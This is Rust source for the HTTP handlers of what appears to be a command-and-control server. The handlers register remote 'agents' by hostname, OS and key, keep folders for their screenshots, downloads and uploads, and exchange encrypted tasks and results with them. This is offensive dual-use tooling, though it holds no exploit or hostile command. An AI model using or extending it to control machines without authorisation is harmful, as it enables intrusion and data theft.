use axum::{
    extract::State,
    Json,
    response::IntoResponse,
};
use hyper::StatusCode;
use log::{error, info};
use x25519_dalek::PublicKey;

use super::helpers::{create_cipher_message, get_server_keypair};
use crate::{
    server::{
        agents::Agent,
        crypto::aesgcm::{decipher, decode, EncMessage, vec_u8_to_u8_32},
        db,
        postdata::{CipherData, PlainData, RegisterAgentData},
    },
    utils::fs::{empty_file, mkdir, mkfile, read_file, write_file},
};

pub async fn handler_home() -> &'static str {
    "Hello world!"
}

pub async fn handler_register(
    State(db_path): State<String>,
    Json(payload): Json<RegisterAgentData>,
) -> (StatusCode, String) {
    // Get current time for `registered` and `last_commit`.
    let now_utc: chrono::DateTime<chrono::Utc> = chrono::Utc::now();
    let today_utc = now_utc.date_naive();

    let agent = Agent::new(
        0,
        payload.name,
        payload.hostname,
        payload.os,
        payload.arch,
        payload.listener_url,
        payload.public_key,
        today_utc.clone(),
        today_utc,
    );

    match db::add_agent(db_path, agent.clone()) {
        Ok(_) => {
            mkdir(format!("agents/{}/downloads", agent.name.to_owned())).unwrap();
            mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
            mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
            mkdir(format!("agents/{}/uploads", agent.name.to_owned())).unwrap();
            mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
            mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();

            return (StatusCode::OK, "".to_string());
        },
        Err(e) => {
            error!("Error adding the agent: {e}");
            return (StatusCode::OK, "".to_string());
        }
    }
}

pub async fn handler_task_ask(
    State(db_path): State<String>,
    Json(payload): Json<PlainData>,
) -> (StatusCode, String) {
    // Get the server kaypair
    let (my_secret, my_public) = match get_server_keypair(db_path.to_string()) {
        Ok((secret, public)) => (secret, public),
        Err(e) => {
            error!("Error: {:?}", e);
            return (StatusCode::OK, "".to_string());
        }
    };

    let agent_name = payload.p;

    let agent = db::get_agent(db_path, agent_name.to_string()).unwrap();
    let encoded_ag_public_key = agent.public_key;
    let decoded_ag_public_key = decode(encoded_ag_public_key.as_bytes());
    let ag_public_key = PublicKey::from(vec_u8_to_u8_32(decoded_ag_public_key).unwrap());

    if let Ok(task) = read_file(format!("agents/{}/task/name", agent_name.to_string())) {
        let cipher_message = create_cipher_message(
            String::from_utf8(task).unwrap(),
            my_secret.clone(),
            ag_public_key.clone(),
        );
        return (StatusCode::OK, cipher_message);
    } else {
        let cipher_message = create_cipher_message(
            "Task not found.".to_string(),
            my_secret.clone(),
            ag_public_key.clone(),
        );
        return (StatusCode::NOT_FOUND, cipher_message);
    }
}

pub async fn handler_task_upload(
    State(db_path): State<String>,
    Json(payload): Json<CipherData>,
) -> (StatusCode, Vec<u8>) {
    // Get the server kaypair
    let (my_secret, my_public) = match get_server_keypair(db_path.to_string()) {
        Ok((secret, public)) => (secret, public),
        Err(e) => {
            error!("Error: {:?}", e);
            return (StatusCode::OK, Vec::new());
        }
    };

    let agent_name = payload.p;
    let ciphertext = payload.c;
    let nonce = payload.n;

    let agent = db::get_agent(db_path, agent_name.to_string()).unwrap();
    let encoded_ag_public_key = agent.public_key;
    let decoded_ag_public_key = decode(encoded_ag_public_key.as_bytes());
    let ag_public_key = PublicKey::from(vec_u8_to_u8_32(decoded_ag_public_key).unwrap());

    // Decipher the ciphertext
    let mut uploaded_file_path = match decipher(
        EncMessage { ciphertext, nonce },
        my_secret.clone(),
        ag_public_key.clone(),
    ) {
        Ok(t) => String::from_utf8(t).unwrap(),
        Err(e) => {
            error!("Error decrypting the task result: {:?}", e);
            return (StatusCode::OK, Vec::new());
        }
    };

    uploaded_file_path = uploaded_file_path.split("/").last().unwrap().to_string();

    match read_file(
        format!(
            "agents/{}/uploads/{}",
            agent_name.to_string(),
            uploaded_file_path.to_string()
        )
    ) {
        Ok(c) => {
            return (StatusCode::OK, c);
        }
        Err(e) => {
            error!("Error reading the uploaded file: {:?}", e);
            return (StatusCode::OK, Vec::new());
        }
    }
}

pub async fn handler_task_result(
    State(db_path): State<String>,
    Json(payload): Json<CipherData>,
) -> (StatusCode, String) {
    // Get the server kaypair
    let (my_secret, my_public) = match get_server_keypair(db_path.to_string()) {
        Ok((secret, public)) => (secret, public),
        Err(e) => {
            error!("Error: {:?}", e);
            return (StatusCode::OK, "".to_string());
        }
    };

    let agent_name = payload.p;
    let ciphertext = payload.c;
    let nonce = payload.n;

    let agent = db::get_agent(db_path, agent_name.to_string()).unwrap();
    let encoded_ag_public_key = agent.public_key;
    let decoded_ag_public_key = decode(encoded_ag_public_key.as_bytes());
    let ag_public_key = PublicKey::from(vec_u8_to_u8_32(decoded_ag_public_key).unwrap());

    // Decipher the ciphertext
    let task_result = match decipher(
        EncMessage { ciphertext, nonce },
        my_secret.clone(),
        ag_public_key.clone(),
    ) {
        Ok(t) => t,
        Err(e) => {
            error!("Error decrypting the task result: {:?}", e);
            Vec::new()
        }
    };

    if let Ok(_) = write_file(
        format!(
            "agents/{}/task/result", agent_name.to_string()),
            &task_result,
    ) {
        // Initialize task
        empty_file(format!("agents/{}/task/name", agent_name.to_string())).unwrap();

        info!("Task result was written.");

        return (StatusCode::OK, "".to_string());
    } else {
        error!("The task result could not be written.");

        return (StatusCode::NOT_ACCEPTABLE, "".to_string());
    }
}

pub async fn handler_404() -> impl IntoResponse {
    info!("404");
    (StatusCode::NOT_FOUND, "oops")
}